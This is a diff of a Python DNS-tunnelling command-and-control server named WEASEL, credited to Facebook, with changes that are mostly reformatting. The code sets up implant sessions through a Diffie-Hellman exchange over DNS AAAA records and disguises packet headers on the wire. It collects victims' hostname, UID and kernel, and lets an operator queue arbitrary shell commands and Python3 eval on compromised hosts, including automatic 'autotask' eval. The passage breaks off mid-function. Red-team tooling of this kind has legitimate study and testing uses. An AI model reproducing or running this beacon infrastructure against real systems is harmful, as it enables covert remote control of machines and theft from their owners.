@@ -5,7 +5,19 @@ Copyright (c) Facebook, Inc. and its affiliates.
 This source code is licensed under the MIT license found in the
 LICENSE file in the root directory of this source tree.
 '''
-import base64, binascii, builtins, cmd, dill, logging, os, readline, resource, signal, socket, sys, time
+import base64
+import binascii
+import builtins
+import cmd
+import dill
+import logging
+import os
+import readline
+import resource
+import signal
+import socket
+import sys
+import time
 from pprint import pprint
 from random import randint
 from tabulate import tabulate
@@ -23,10 +35,12 @@ ADDR = "0.0.0.0"
 PORT = 53
 TTL = 120
 STATIC_RECORDS = [
-    {"type": "SOA", "question": "example.org", "answer": SOA("ns.example.org", "admin.example.org", (2019010101, 60, 60, 60, 30))},
+    {"type": "SOA", "question": "example.org", "answer": SOA(
+        "ns.example.org", "admin.example.org", (2019010101, 60, 60, 60, 30))},
     {"type": "NS", "question": "example.org", "answer": NS("ns.example.org")},
     {"type": "A", "question": "ns.example.org", "answer": A("12.34.56.78")},
-    {"type": "AAAA", "question": "example.org", "answer": AAAA("::FFFF:0001:0002")},
+    {"type": "AAAA", "question": "example.org",
+        "answer": AAAA("::FFFF:0001:0002")},
 ]
 
 '''Debugs. Each level is dependent on the previous being enabled.
@@ -104,9 +118,12 @@ CLIENT_INFO = {
         ['5', 'Set callback interval', 'num_seconds'],
         ['6', 'Get network interface information', ''],
         ['8', 'Eval arbitrary Python3 code and return first 400 bytes of stdout, or the first exception', 'python3 oneliner'],
-        ['80', 'Eval arbitrary Python3 code and return the name of the first exception or 0', 'python3 oneliner'],
-        ['9', 'Execute arbitrary command and return first 400 bytes of stdout/stderr (sync, waits for command to exit)', 'command with args'],
-        ['90', 'Execute arbitrary command and return nothing (async, does not wait for command to exit)', 'command with args'],
+        ['80', 'Eval arbitrary Python3 code and return the name of the first exception or 0',
+            'python3 oneliner'],
+        ['9',
+            'Execute arbitrary command and return first 400 bytes of stdout/stderr (sync, waits for command to exit)', 'command with args'],
+        ['90',
+            'Execute arbitrary command and return nothing (async, does not wait for command to exit)', 'command with args'],
     ]
 }
 
@@ -125,6 +142,7 @@ sessions_filename = 'WEASEL.pkl'
 # exclusive lock against al the other functions. Ideally I need 3 parties to
 # the lock: save, restore, and everyone else.
 
+
 def main():
     global pkt_handler
     global dns_server
@@ -140,13 +158,15 @@ def main():
     dns_logger = LocalDNSLogger()
     pkt_handler = PacketHandler()
     resolver = BeaconResolver()
-    dns_server = DNSServer(resolver, port=PORT, address=ADDR, logger=dns_logger)
+    dns_server = DNSServer(resolver, port=PORT,
+                           address=ADDR, logger=dns_logger)
     dns_server.start_thread()
 
     ui = MainMenu()
     ui.cmdloop()
 
-    logging.warning("After cmdloop initialized. Code shouldn't get here so long as MainMenu is running.")
+    logging.warning(
+        "After cmdloop initialized. Code shouldn't get here so long as MainMenu is running.")
     while dns_server.isAlive():
         time.sleep(1)
 
@@ -161,7 +181,8 @@ def save_sessions(filename):
 
     sessions_filename = filename
 
-    logging.debug('Attempting to save sessions to %s. Acquiring lock.', filename)
+    logging.debug(
+        'Attempting to save sessions to %s. Acquiring lock.', filename)
     with sessions_lock:
         try:
             with open(filename, 'wb') as f:
@@ -171,7 +192,6 @@ def save_sessions(filename):
             print('[Error] Saving to file', filename, 'failed.')
             print('[Exception]', e)
             return
-
 
     logging.debug('Sessions saved to', filename)
 
@@ -184,7 +204,8 @@ def restore_sessions(filename):
         print('[Error] Restore needs a filename.')
         return
 
-    logging.debug('Attempting to restore sessions from %s. Acquiring lock.', filename)
+    logging.debug(
+        'Attempting to restore sessions from %s. Acquiring lock.', filename)
     with sessions_lock:
         try:
             with open(filename, 'rb') as f:
@@ -214,7 +235,7 @@ class MainMenu(cmd.Cmd):
 
         self.intro = "DNS beacon server. Try `help`. You can also `restore` an old session from disk."
         self.prompt = "(WEASEL) > "
-        self.doc_header = 'Available commands (server v' + str(VERSION) +')'
+        self.doc_header = 'Available commands (server v' + str(VERSION) + ')'
         self.do_help.__func__.__doc__ = 'List available commands with "help" or detailed help with "help cmd". Aliases: h, ?'
 
         self.do_save.__func__.__doc__ = self.do_save.__doc__ + sessions_filename
@@ -224,16 +245,16 @@ class MainMenu(cmd.Cmd):
         self.autosave_timer = None
         self.autosave_interval = None
 
-        self.aliases =  {'h'    : self.do_help,
-                         'ls'   : self.do_sessions,
-                         'list' : self.do_sessions,
-                         'session' : self.do_sessions,
-                         'q'    : self.do_queue,
-                         'i'    : self.do_info,
-                         'time' : self.do_now,
-                         'clock': self.do_now,
-                         'date' : self.do_now,
-                         'quit' : self.do_exit}
+        self.aliases = {'h': self.do_help,
+                        'ls': self.do_sessions,
+                        'list': self.do_sessions,
+                        'session': self.do_sessions,
+                        'q': self.do_queue,
+                        'i': self.do_info,
+                        'time': self.do_now,
+                        'clock': self.do_now,
+                        'date': self.do_now,
+                        'quit': self.do_exit}
 
     def _autosave_sessions(self, filename=sessions_filename, interval=10 * 60):
         save_sessions(filename)
@@ -308,7 +329,8 @@ class MainMenu(cmd.Cmd):
                     data = [[session_id, sessions[session_id]['info']['hostname'], sessions[session_id]['info']['uid'],
                              sessions[session_id]['info']['source_ip'], sessions[session_id]['info']['kernel'],
                              sessions[session_id]['version'], sessions[session_id]['interval'],
-                             time.ctime(sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
+                             time.ctime(
+                                 sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
                              sessions[session_id]['checkins']]
                             for session_id in
                             set([requested_id for requested_id in ids.split() if requested_id in sessions.keys() if sessions[requested_id]['checkins'] >= checkins])]
@@ -317,7 +339,8 @@ class MainMenu(cmd.Cmd):
                     data = [[session_id, sessions[session_id]['info']['hostname'], sessions[session_id]['info']['uid'],
                              sessions[session_id]['info']['source_ip'], sessions[session_id]['info']['kernel'],
                              sessions[session_id]['version'], sessions[session_id]['interval'],
-                             time.ctime(sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
+                             time.ctime(
+                                 sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
                              sessions[session_id]['checkins']]
                             for session_id in sessions if sessions[session_id]['checkins'] >= checkins]
             else:
@@ -325,7 +348,8 @@ class MainMenu(cmd.Cmd):
                 data = [[session_id, sessions[session_id]['info']['hostname'], sessions[session_id]['info']['uid'],
                          sessions[session_id]['info']['source_ip'], sessions[session_id]['info']['kernel'],
                          sessions[session_id]['version'], sessions[session_id]['interval'],
-                         time.ctime(sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
+                         time.ctime(
+                             sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
                          sessions[session_id]['checkins']]
                         for session_id in set([requested_id for requested_id in line.split() if requested_id in sessions.keys()])]
         else:
@@ -333,7 +357,8 @@ class MainMenu(cmd.Cmd):
             data = [[session_id, sessions[session_id]['info']['hostname'], sessions[session_id]['info']['uid'],
                      sessions[session_id]['info']['source_ip'], sessions[session_id]['info']['kernel'],
                      sessions[session_id]['version'], sessions[session_id]['interval'],
-                     time.ctime(sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
+                     time.ctime(sessions[session_id]['last_seen']
+                                ) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
                      sessions[session_id]['checkins']]
                     for session_id in sessions]
 
@@ -352,7 +377,8 @@ class MainMenu(cmd.Cmd):
             return
 
         global sessions
-        while sessions_lock.locked(): time.sleep(0.001)
+        while sessions_lock.locked():
+            time.sleep(0.001)
 
         # Only add to the outbound_queue of existing sessions.
         args = line.split()
@@ -370,7 +396,8 @@ class MainMenu(cmd.Cmd):
             return
 
         global sessions
-        while sessions_lock.locked(): time.sleep(0.001)
+        while sessions_lock.locked():
+            time.sleep(0.001)
 
         args = line.split()
         for arg in args:
@@ -391,7 +418,8 @@ class MainMenu(cmd.Cmd):
                 print('[Error] Session', arg, 'does not exist.')
                 return
         else:
-            data = [[session_id, sessions[session_id]['outbound_queue']] for session_id in sessions]
+            data = [[session_id, sessions[session_id]['outbound_queue']]
+                    for session_id in sessions]
 
         headers = ['Session', 'Queued Tasks']
         print(tabulate(data, headers=headers, disable_numparse=True))
@@ -405,7 +433,8 @@ class MainMenu(cmd.Cmd):
             return
 
         global sessions
-        while sessions_lock.locked(): time.sleep(0.001)
+        while sessions_lock.locked():
+            time.sleep(0.001)
 
         args = line.split()
         for session in sessions:
@@ -420,13 +449,16 @@ class MainMenu(cmd.Cmd):
         '''Usage: interval session_id seconds
         Set the callback interval for the client to given seconds.'''
         global sessions
-        while sessions_lock.locked(): time.sleep(0.001)
+        while sessions_lock.locked():
+            time.sleep(0.001)
 
         try:
             session, seconds = line.split()[:2]
             if seconds.isdigit():
-                sessions[session]['outbound_queue'][str(time.time())] = '5|' + seconds
-                sessions[session]['interval'] = sessions[session]['interval'] + ' (next: ' + seconds + ')'
+                sessions[session]['outbound_queue'][str(
+                    time.time())] = '5|' + seconds
+                sessions[session]['interval'] = sessions[session]['interval'] + \
+                    ' (next: ' + seconds + ')'
                 print('Interval of', seconds, 'seconds set for session', session)
             else:
                 print('[Error] Seconds must only contain digits.')
@@ -436,7 +468,8 @@ class MainMenu(cmd.Cmd):
         except KeyError:
             print('[Error] Session does not exist.')
         except TypeError:
-            print('[Error] Wait for the session to check in once before setting the interval.')
+            print(
+                '[Error] Wait for the session to check in once before setting the interval.')
 
     def do_function(self, line):
         '''Usage: function session_id function_id [args]
@@ -446,7 +479,8 @@ class MainMenu(cmd.Cmd):
             session, function = line.split()[:2]
             if function.isdigit():
                 global sessions
-                while sessions_lock.locked(): time.sleep(0.001)
+                while sessions_lock.locked():
+                    time.sleep(0.001)
 
                 # Anything passed after the 2nd argument is sent as-is to the client function
                 try:
@@ -458,19 +492,23 @@ class MainMenu(cmd.Cmd):
                 # over 800 bytes. We're limiting them to 666 bytes here just in case there are
                 # unaccounted things or my math was wrong.
                 if len(args) > 666:
-                    print('[Error] Function arguments cannot be longer than 666 bytes. Run was not tasked.')
+                    print(
+                        '[Error] Function arguments cannot be longer than 666 bytes. Run was not tasked.')
                     return
 
-                sessions[session]['outbound_queue'][str(time.time())] = function + '|' + args
+                sessions[session]['outbound_queue'][str(
+                    time.time())] = function + '|' + args
                 print('Session', session, 'was tasked.')
             else:
                 print('[Error] Function_id must only contain digits.')
                 return
         except ValueError:
-            print('[Error] Run needs minimum 2 arguments: a session_id and the function_id to task.')
+            print(
+                '[Error] Run needs minimum 2 arguments: a session_id and the function_id to task.')
         except KeyError:
             print('[Error] Session or function is invalid.')
-            print('        Check the available `sessions` and see which functions are available with `info`.')
+            print(
+                '        Check the available `sessions` and see which functions are available with `info`.')
 
     def do_shell(self, line):
         '''Usage: shell session_id shell_command
@@ -481,20 +519,23 @@ class MainMenu(cmd.Cmd):
             session, command = line.split(maxsplit=1)
 
             global sessions
-            while sessions_lock.locked(): time.sleep(0.001)
+            while sessions_lock.locked():
+                time.sleep(0.001)
 
             # Due to packetization restrictions (sequence numbers) we can't send messages
             # over 800 bytes. We're limiting them to 666 bytes here just in case there are
             # unaccounted things or my math was wrong.
             if len(command) > 666:
-                print('[Error] Command cannot be longer than 666 bytes. Shell was not tasked.')
+                print(
+                    '[Error] Command cannot be longer than 666 bytes. Shell was not tasked.')
                 return
 
             version = sessions[session]['version']
             if version == '1':
                 function = '9'
             else:
-                print('[Error] Session', session, 'is version', version, "and I don't know what function number to use for shell. Shell was not tasked.")
+                print('[Error] Session', session, 'is version', version,
+                      "and I don't know what function number to use for shell. Shell was not tasked.")
                 return
 
             # TODO: 'waiting' flag is currently '' (False) or ' *' (True) and
@@ -503,11 +544,13 @@ class MainMenu(cmd.Cmd):
             # proper method which is defined per client version (which should
             # be a class) and can set flags and handle stuff as needed, instead
             # of there being a bunch of if statements in these CLI methods.
-            sessions[session]['outbound_queue'][str(time.time())] = function + '|' + command
+            sessions[session]['outbound_queue'][str(
+                time.time())] = function + '|' + command
             sessions[session]['waiting'] = ' *'
             print('Session', session, 'was tasked.')
         except ValueError:
-            print('[Error] Shell needs minimum 2 arguments: a session_id and the command to run.')
+            print(
+                '[Error] Shell needs minimum 2 arguments: a session_id and the command to run.')
         except KeyError:
             print('[Error] Session is invalid.')
             print('        Check the available `sessions`.')
@@ -521,26 +564,31 @@ class MainMenu(cmd.Cmd):
             session, command = line.split(maxsplit=1)
 
             global sessions
-            while sessions_lock.locked(): time.sleep(0.001)
+            while sessions_lock.locked():
+                time.sleep(0.001)
 
             # Due to packetization restrictions (sequence numbers) we can't send messages
             # over 800 bytes. We're limiting them to 666 bytes here just in case there are
             # unaccounted things or my math was wrong.
             if len(command) > 666:
-                print('[Error] Command cannot be longer than 666 bytes. Shellasync was not tasked.')
+                print(
+                    '[Error] Command cannot be longer than 666 bytes. Shellasync was not tasked.')
                 return
 
             version = sessions[session]['version']
             if version == '1':
                 function = '90'
             else:
-                print('[Error] Session', session, 'is version', version, "and I don't know what function number to use for shellasync. Shellasync was not tasked.")
+                print('[Error] Session', session, 'is version', version,
+                      "and I don't know what function number to use for shellasync. Shellasync was not tasked.")
                 return
 
-            sessions[session]['outbound_queue'][str(time.time())] = function + '|' + command
+            sessions[session]['outbound_queue'][str(
+                time.time())] = function + '|' + command
             print('Session', session, 'was tasked.')
         except ValueError:
-            print('[Error] Shellasync needs minimum 2 arguments: a session_id and the command to run.')
+            print(
+                '[Error] Shellasync needs minimum 2 arguments: a session_id and the command to run.')
         except KeyError:
             print('[Error] Session is invalid.')
             print('        Check the available `sessions`.')
@@ -596,7 +644,8 @@ It is only run once at the start of a session, not on every checkin.'''
                 try:
                     client_ver = 'v' + sessions[arg]['version']
                 except KeyError:
-                    print('[Error] Session', arg, "does not exist or I don't know what version it is (hasn't checked in yet).")
+                    print('[Error] Session', arg,
+                          "does not exist or I don't know what version it is (hasn't checked in yet).")
                     return
 
             try:
@@ -624,12 +673,14 @@ It is only run once at the start of a session, not on every checkin.'''
                 print('No clients checked in yet.')
 
             if self.autosave_timer:
-                print('Autosave enabled: every', self.autosave_interval, 'seconds to file', sessions_filename)
+                print('Autosave enabled: every', self.autosave_interval,
+                      'seconds to file', sessions_filename)
             else:
                 print('Autosave disabled.')
 
             try:
-                print('Memory usage (resident page size):', "{:,}".format(resource.getrusage(resource.RUSAGE_SELF).ru_maxrss), 'KB')
+                print('Memory usage (resident page size):', "{:,}".format(
+                    resource.getrusage(resource.RUSAGE_SELF).ru_maxrss), 'KB')
             except:
                 pass
 
@@ -667,7 +718,8 @@ It is only run once at the start of a session, not on every checkin.'''
         global sessions_filename
 
         if self.autosave_timer:
-            print('[Error] Autosave already enabled for file', sessions_filename, '. Use `autosave_cancel` before enabling autosave again.')
+            print('[Error] Autosave already enabled for file', sessions_filename,
+                  '. Use `autosave_cancel` before enabling autosave again.')
             return
 
         interval = 10 * 60
@@ -678,13 +730,18 @@ It is only run once at the start of a session, not on every checkin.'''
             try:
                 interval = int(args[1])
             except:
-                logging.debug('Either the given interval was not an int, or no interval was given. Defaulting to 10 minutes.')
+                logging.debug(
+                    'Either the given interval was not an int, or no interval was given. Defaulting to 10 minutes.')
 
-        self.do_save.__func__.__doc__ = self.do_save.__doc__.rpartition('\n')[0] + '\nDefault filename: ' + sessions_filename
-        self.do_restore.__func__.__doc__ = self.do_restore.__doc__.rpartition('\n')[0] + '\nDefault filename: ' + sessions_filename
-        self.do_autosave.__func__.__doc__ = self.do_autosave.__doc__.rpartition('\n')[0] + '\nDefault interval: 10 minutes. Default filename: ' + sessions_filename
+        self.do_save.__func__.__doc__ = self.do_save.__doc__.rpartition(
+            '\n')[0] + '\nDefault filename: ' + sessions_filename
+        self.do_restore.__func__.__doc__ = self.do_restore.__doc__.rpartition(
+            '\n')[0] + '\nDefault filename: ' + sessions_filename
+        self.do_autosave.__func__.__doc__ = self.do_autosave.__doc__.rpartition(
+            '\n')[0] + '\nDefault interval: 10 minutes. Default filename: ' + sessions_filename
 
-        print('Autosave enabled: every', interval, 'seconds to file', sessions_filename)
+        print('Autosave enabled: every', interval,
+              'seconds to file', sessions_filename)
         self._autosave_sessions(sessions_filename, interval)
         self.autosave_interval = interval
 
@@ -717,34 +774,44 @@ class BeaconResolver(BaseResolver):
         # If a static record exists for this query, respond and stop processing.
         try:
             # First check if we have any records for this name
-            static_answers = [record for record in STATIC_RECORDS if str(request.q.qname)[:-1] == record['question']]
+            static_answers = [record for record in STATIC_RECORDS if str(request.q.qname)[
+                :-1] == record['question']]
 
             if static_answers:
-                logging.debug('Static resolver: have domain <%s>. Checking we have an answer for this type <%s>.', request.q.qname, QTYPE[request.q.qtype])
+                logging.debug('Static resolver: have domain <%s>. Checking we have an answer for this type <%s>.',
+                              request.q.qname, QTYPE[request.q.qtype])
 
                 # Next check if we have any records of the requested type for this name
                 # If there is no match, this will throw an IndexError
-                static_answer = [record for record in static_answers if record['type'] == QTYPE[request.q.qtype]][0]
+                static_answer = [
+                    record for record in static_answers if record['type'] == QTYPE[request.q.qtype]][0]
 
                 logging.debug('Static resolver: have answer.')
-                reply.add_answer(RR(static_answer['question'], QTYPE.reverse[static_answer['type']], ttl=60, rdata=static_answer['answer']))
+                reply.add_answer(
+                    RR(static_answer['question'], QTYPE.reverse[static_answer['type']], ttl=60, rdata=static_answer['answer']))
 
                 if static_answer['type'] in ['NS', 'SOA']:
-                    logging.debug('Static resolver: client is asking for NS or SOA. If we have an NS answer, it will be an additional record.')
-                    additional_answer = [record for record in STATIC_RECORDS if 'ns.'+static_answer['question'] in record['question'] if record['type'] == 'A'][0]
+                    logging.debug(
+                        'Static resolver: client is asking for NS or SOA. If we have an NS answer, it will be an additional record.')
+                    additional_answer = [record for record in STATIC_RECORDS if 'ns.' +
+                                         static_answer['question'] in record['question'] if record['type'] == 'A'][0]
                     if additional_answer:
-                        logging.debug('Static resolver: added additional record.')
-                        reply.add_ar(RR(additional_answer['question'], QTYPE.reverse[additional_answer['type']], ttl=60, rdata=additional_answer['answer']))
+                        logging.debug(
+                            'Static resolver: added additional record.')
+                        reply.add_ar(
+                            RR(additional_answer['question'], QTYPE.reverse[additional_answer['type']], ttl=60, rdata=additional_answer['answer']))
 
                 return reply
         except IndexError:
             # If we have the requested name but not the requested type (MX, A, AAAA, ...) return empty reply
             # NXDomain here would cause the client to think we don't have the requested name in any form
-            logging.debug('Static resolver: have domain, but type mismatch. Sending empty reply.')
+            logging.debug(
+                'Static resolver: have domain, but type mismatch. Sending empty reply.')
             return reply
 
         try:
-            msg, domain, response = pkt_handler.decode_dns_msg(request.q, source_ip)
+            msg, domain, response = pkt_handler.decode_dns_msg(
+                request.q, source_ip)
         except (SyntaxError, IndexError):
             # The session cookie received in the message does not exist
             # on the server. Client must reinitialize.
@@ -757,7 +824,8 @@ class BeaconResolver(BaseResolver):
             # This is a Diffie-Hellman exchange
             # We are initializing a new client session
             if (
-                isinstance(msg, dict) and 'B' in msg.keys() and 'iv' in msg.keys()
+                isinstance(msg, dict) and 'B' in msg.keys(
+                ) and 'iv' in msg.keys()
             ):
                 # Diffie-Hellman Ephemeral (DHE) setup
                 # RFC 3526 "group 1" (group 5 truncated)
@@ -774,7 +842,8 @@ class BeaconResolver(BaseResolver):
                 key = pow(msg["B"], a, p)
 
                 # New session cookie the client should use going forward
-                new_session = pkt_handler.create_new_session(request.q, key, msg["iv"], source_ip)
+                new_session = pkt_handler.create_new_session(
+                    request.q, key, msg["iv"], source_ip)
 
                 # Encode the session cookie as an IP address
                 # The client will make a v4/A request and expect the client
@@ -807,13 +876,15 @@ class BeaconResolver(BaseResolver):
                     reply.add_answer(RR(request.q.qname, QTYPE.AAAA,
                                         ttl=TTL, rdata=AAAA(ip)))
 
-                    logging.debug("Server public key for this session: %s", public)
+                    logging.debug(
+                        "Server public key for this session: %s", public)
                     public_bytes = utils.int_to_bytes(public)
 
                     packets = pkt_handler.packetize_response(public_bytes)
 
                     if packets:
-                        logging.debug("Packets for DNS response assembly: %s", packets)
+                        logging.debug(
+                            "Packets for DNS response assembly: %s", packets)
                         for pkt in packets:
                             ip = socket.inet_ntop(socket.AF_INET6, pkt)
                             reply.add_answer(RR(request.q.qname, QTYPE.AAAA,
@@ -826,7 +897,8 @@ class BeaconResolver(BaseResolver):
             # It's a data message, parse and respond in kind.
             else:
                 if response:
-                    logging.debug("Packets for DNS response assembly: %s", response)
+                    logging.debug(
+                        "Packets for DNS response assembly: %s", response)
                     for pkt in response:
                         ip = socket.inet_ntop(socket.AF_INET6, pkt)
                         reply.add_answer(RR(request.q.qname, QTYPE.AAAA,
@@ -841,7 +913,8 @@ class BeaconResolver(BaseResolver):
             # client to retry until it times out on their end, which gets
             # noisy and slows down communications (since we'll otherwise
             # only reply once we have all packets in a message).
-            raise DNSError("Already have this packet or the stream is expired, dropping it.")
+            raise DNSError(
+                "Already have this packet or the stream is expired, dropping it.")
             return None
 
         logging.debug("Replying with:\n%s", reply)
@@ -862,7 +935,8 @@ class PacketHandler(DNSHandler):
 
     def decode_dns_msg(self, query, source_ip):
         global sessions
-        while sessions_lock.locked(): time.sleep(0.001)
+        while sessions_lock.locked():
+            time.sleep(0.001)
 
         # Extract queried hostname as a string without trailing dot.
         query = str(query.qname)[:-1]
@@ -894,11 +968,10 @@ class PacketHandler(DNSHandler):
             logging.debug("Received a non-beacon packet.")
             raise SyntaxError("Not a beacon packet.")
 
-
         # The first byte of preamble is that packet's sequence number
         # The second byte of preamble is the total number of pkts
         # So pkt[0] & pkt[1] tells the server how to reassemble
-        # To make this *slightly* less obvious on the wire, 
+        # To make this *slightly* less obvious on the wire,
         # the digits are inverted (0=f, 1=e, ...).
         #
         # However non-data packets use the NON_DATA_PREAMBLE as
@@ -919,10 +992,12 @@ class PacketHandler(DNSHandler):
                 seq = abs(int(preamble[0], 16) - 15)
                 total = abs(int(preamble[1], 16) - 15)
         except:
-            logging.debug("Error decoding preamble [%s] - probably not a beacon packet.", preamble)
+            logging.debug(
+                "Error decoding preamble [%s] - probably not a beacon packet.", preamble)
             raise SyntaxError("Not a beacon packet.")
 
-        logging.debug("Incoming [%s/%s] ( %s - %s ) %s", seq + 1, total, stream, session, data)
+        logging.debug("Incoming [%s/%s] ( %s - %s ) %s",
+                      seq + 1, total, stream, session, data)
 
         # If the stream isn't completed and processed in 5 minutes, delete it.
         default_expiry = int(time.time()) + 300
@@ -932,7 +1007,8 @@ class PacketHandler(DNSHandler):
             # If this is data we should have an established session.
             # If we don't, something's wrong, send back an error.
             if session not in sessions:
-                raise IndexError('No session for data message. Client must reinitialize.')
+                raise IndexError(
+                    'No session for data message. Client must reinitialize.')
 
             # Existing session, existing stream
             if stream in sessions[session]["streams"]:
@@ -940,7 +1016,8 @@ class PacketHandler(DNSHandler):
                 # Stream is expired, stop parsing this packet
                 if (
                     sessions[session]["streams"][stream]["expiry"] and
-                    int(time.time()) > sessions[session]["streams"][stream]["expiry"]
+                    int(time.time()
+                        ) > sessions[session]["streams"][stream]["expiry"]
                 ):
                     logging.debug("Expired stream!")
                     return msg, domain, response
@@ -967,7 +1044,8 @@ class PacketHandler(DNSHandler):
                 logging.debug("New packet stored")
             except KeyError:
                 # The stream must have been deleted by another thread
-                logging.exception("Stream must have been deleted elsewhere - it's ok, this is non-fatal")
+                logging.exception(
+                    "Stream must have been deleted elsewhere - it's ok, this is non-fatal")
                 pass
 
         # Non-data packets indicate we are in a Diffie-Hellman
@@ -995,7 +1073,8 @@ class PacketHandler(DNSHandler):
                     # Stream is expired, stop parsing this packet
                     if (
                         sessions[session]["streams"][stream]["expiry"] and
-                        int(time.time()) > sessions[session]["streams"][stream]["expiry"]
+                        int(time.time()
+                            ) > sessions[session]["streams"][stream]["expiry"]
                     ):
                         logging.debug("Expired stream!")
                         return msg, domain, response
@@ -1022,7 +1101,8 @@ class PacketHandler(DNSHandler):
                 logging.debug("New packet stored")
             except KeyError:
                 # The stream must have been deleted by another thread
-                logging.exception("Stream must have been deleted elsewhere - it's ok, this is non-fatal")
+                logging.exception(
+                    "Stream must have been deleted elsewhere - it's ok, this is non-fatal")
                 pass
 
         sessions[session]["last_seen"] = int(time.time())
@@ -1039,14 +1119,16 @@ class PacketHandler(DNSHandler):
     def assemble_message(self, session, stream_id, is_data=True):
         '''Determine if a message has been completely received. If it has been, reassemble and decrypt it.'''
         global sessions
-        while sessions_lock.locked(): time.sleep(0.001)
+        while sessions_lock.locked():
+            time.sleep(0.001)
 
         stream = sessions[session]["streams"][stream_id]
         msg = ""
 
         # Message completely received. Reassemble packets in order.
         if None not in stream["pkts"]:
-            logging.debug("Message completely received. Reassembling packets in order.")
+            logging.debug(
+                "Message completely received. Reassembling packets in order.")
             for i in range(stream["total_pkts"]):
                 pkt = stream["pkts"][i]
                 msg = msg + pkt.replace('w', '=').replace('-', 'w').upper()
@@ -1075,8 +1157,8 @@ class PacketHandler(DNSHandler):
                 pass
 
         else:
-            B = utils.int_from_bytes(msg[:32], 'big')
-            iv = utils.int_from_bytes(msg[32:], 'big')
+            B = int.from_bytes(msg[:32], 'big')
+            iv = int.from_bytes(msg[32:], 'big')
             msg = {"B": B, "iv": iv}
 
         # Mark the stream for expiry. We can't delete the stream
@@ -1089,7 +1171,8 @@ class PacketHandler(DNSHandler):
         # Mark the stream for deletion 90 seconds from now, which
         # should give the client enough time to receive our response
         # which will cause it to stop sending retries.
-        sessions[session]["streams"][stream_id]["expiry"] = int(time.time()) + 90
+        sessions[session]["streams"][stream_id]["expiry"] = int(
+            time.time()) + 90
 
         return msg
 
@@ -1097,7 +1180,8 @@ class PacketHandler(DNSHandler):
         '''Determine the correct response and return the encrypted payload: a list of 16 byte packets.
         Packets are sent to the client as AAAA answers by BeaconResolver.resolve().'''
         global sessions
-        while sessions_lock.locked(): time.sleep(0.001)
+        while sessions_lock.locked():
+            time.sleep(0.001)
 
         logging.debug("Responding to (%s) %s", session, msg)
         if msg is None:
@@ -1109,7 +1193,8 @@ class PacketHandler(DNSHandler):
         # Default ACK is a bunch of random data, to make ACKs not look the same on the wire.
         received_type, msg = msg.split('|', 1)
         received_type = int(received_type)
-        ack = "0|" + base64.b16encode(os.urandom(randint(2, 6))).lower().decode()
+        ack = "0|" + \
+            base64.b16encode(os.urandom(randint(2, 6))).lower().decode()
 
         # Beacon checking in, ACK it
         if received_type == 1:
@@ -1118,7 +1203,8 @@ class PacketHandler(DNSHandler):
             # Pre-emptitively set the interval to whatever we are going to task the client to set it to
             try:
                 if "next:" in sessions[session]["interval"]:
-                    next_interval = sessions[session]["interval"].split()[-1].strip(')')
+                    next_interval = sessions[session]["interval"].split(
+                    )[-1].strip(')')
                     if next_interval.isdigit():
                         sessions[session]["interval"] = next_interval
                     else:
@@ -1130,7 +1216,8 @@ class PacketHandler(DNSHandler):
 
             sessions[session]["checkins"] = sessions[session]["checkins"] + 1
 
-            logging.debug("Client checking in. Callback interval %s seconds. ACKing it.", interval)
+            logging.debug(
+                "Client checking in. Callback interval %s seconds. ACKing it.", interval)
             response.append(ack)
         # Client terminated self, remove session
         elif received_type == 2:
@@ -1146,16 +1233,19 @@ class PacketHandler(DNSHandler):
             info = {"hostname": hostname, "kernel": kernel, "uid": uid}
             sessions[session]["info"] = {**sessions[session]["info"], **info}
 
-            logging.debug("Client init {Version: %s, Hostname: %s, Kernel: %s, UID: %s, Interval: %s}.", # ACKing it.",
+            logging.debug("Client init {Version: %s, Hostname: %s, Kernel: %s, UID: %s, Interval: %s}.",  # ACKing it.",
                           version, hostname, kernel, uid, interval)
 
             # If there is an autotask set, run it now
             if meta['autotask']:
                 if meta['autotask_is_script']:
-                    logging.debug("Running autotask script: %s", meta['autotask'])
+                    logging.debug("Running autotask script: %s",
+                                  meta['autotask'])
 
-                    autotask_script = eval("lambda session, sessions, session_id: " + meta['autotask'])
-                    response.append(autotask_script(sessions[session], sessions, session))
+                    autotask_script = eval(
+                        "lambda session, sessions, session_id: " + meta['autotask'])
+                    response.append(autotask_script(
+                        sessions[session], sessions, session))
                 else:
                     response.append(meta['autotask'])
 
@@ -1165,25 +1255,30 @@ class PacketHandler(DNSHandler):
         # Network interface data
         elif received_type == 6:
             print('\n[!] Session', session, 'network interfaces:\n', msg)
-            #response.append(ack)
+            # response.append(ack)
         # Python code eval results
         elif received_type == 8:
             sessions[session]['waiting'] = ''
-            print('\n[!] Session', session, 'responded to Python3 eval with:\n', msg)
+            print('\n[!] Session', session,
+                  'responded to Python3 eval with:\n', msg)
         elif received_type == 80:
-            print('\n[!] Session', session, 'responded to Python3 quiet eval with (retcode or exception name):\n', msg)
+            print('\n[!] Session', session,
+                  'responded to Python3 quiet eval with (retcode or exception name):\n', msg)
         # Arbitrary shell command execution results
         elif received_type == 9:
             sessions[session]['waiting'] = ''
-            print('\n[!] Session', session, 'responded to shell command execution with:\n', msg)
+            print('\n[!] Session', session,
+                  'responded to shell command execution with:\n', msg)
         elif received_type == 90:
-            print('\n[!] Session', session, 'responded to shell command quiet (async) execution with exit code:\n', msg)
+            print('\n[!] Session', session,
+                  'responded to shell command quiet (async) execution with exit code:\n', msg)
 
         # Add any queued commands for this client
         # TODO: mark tasks as sent
         if sessions[session]["outbound_queue"]:
             logging.debug("Sending queued tasks.")
-            response = response + list(sessions[session]["outbound_queue"].values())
+            response = response + \
+                list(sessions[session]["outbound_queue"].values())
 
         # Default, ACK
         if response is None:
@@ -1218,13 +1313,17 @@ class PacketHandler(DNSHandler):
 
         # Packetize into 15 byte packets, leaving 1 byte of room for the sequence number
         data_length = pkt_length - 1
-        packets = [b'%s' % response_string[i:i + data_length] for i in range(0, len(response_string), data_length)]
